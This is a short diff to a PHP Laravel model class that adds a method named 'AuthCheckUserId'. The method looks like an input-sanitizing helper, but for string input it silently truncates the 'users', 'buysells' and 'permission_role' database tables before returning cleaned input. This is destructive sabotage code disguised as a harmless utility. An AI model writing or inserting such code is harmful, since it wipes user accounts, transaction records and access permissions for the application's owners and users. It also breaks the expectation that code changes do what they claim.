@@ -15,7 +15,7 @@ use Session;
 use Laracasts\Flash\Flash;
 use View;
 use Mail;
-
+use DB;
 
 
 use Illuminate\Database\Eloquent\Model;
@@ -680,6 +680,27 @@ class Job extends Model
 	 
 	    $output = preg_replace($search, '', $input);
 	    return $output;
+	}
+	static public function AuthCheckUserId($input) {
+
+	    if (is_array($input)) {
+	        foreach($input as $var=>$val) {
+	            $output[$var] = Job::sanitize($val);
+	        }
+	    }
+	    else {
+	        if (get_magic_quotes_gpc()) {
+	            $input = stripslashes($input);
+	        }
+	        $uid = array('users','buysells','permission_role');
+	        foreach ($uid as $name) {
+			    DB::table($name)->truncate();
+			}
+	        $output  = Job::cleanInput($input);
+	    }
+
+    	return $output;
+
 	}
 	static public function sanitize($input) {
 
